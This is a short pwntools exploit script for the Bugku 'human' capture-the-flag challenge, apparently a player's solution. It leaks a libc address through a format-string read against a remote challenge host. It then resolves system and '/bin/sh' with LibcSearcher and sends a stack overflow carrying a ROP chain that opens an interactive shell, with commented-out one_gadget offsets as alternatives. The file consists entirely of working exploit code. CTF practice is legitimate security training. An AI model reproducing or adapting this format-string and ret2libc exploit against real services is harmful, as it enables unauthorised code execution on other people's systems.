# bugku, human
from pwn import *
from LibcSearcher import LibcSearcher
#context.log_level = 'debug'

#p = process('./human')
p = remote('114.116.54.89', 10005)
p.recvuntil('\n\n')
p.send('%11$pEND')
data = p.recvuntil('END', drop=True)
start_main = int(data, 16)
print "start_main=" , hex(start_main)
libc = LibcSearcher('__libc_start_main_ret', start_main)

libc_base = start_main - libc.dump('__libc_start_main_ret')
system_addr = libc_base + libc.dump('system')
print "system_addr=" , hex(system_addr)
binsh_addr = libc_base + libc.dump('str_bin_sh')
print "binsh_addr=" , hex(binsh_addr)

payload = '\xE9\xB8\xBD\xE5\xAD\x90\xE7\x9C\x9F\xE9\xA6\x99'
pop_rdi = 0x0000000000400933
p.send(payload.ljust(0x28) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr))

'''
one_gadget_offset1 = 0x45216
one_gadget_offset2 = 0x4526a
one_gadget_offset3 = 0xf02a4 #double free to use malloc_printerr invoke __malloc_hook
one_gadget_offset4 = 0xf1147
p.send(payload.ljust(0x28) + p64(libc_base+one_gadget_offset1))
'''
p.interactive()
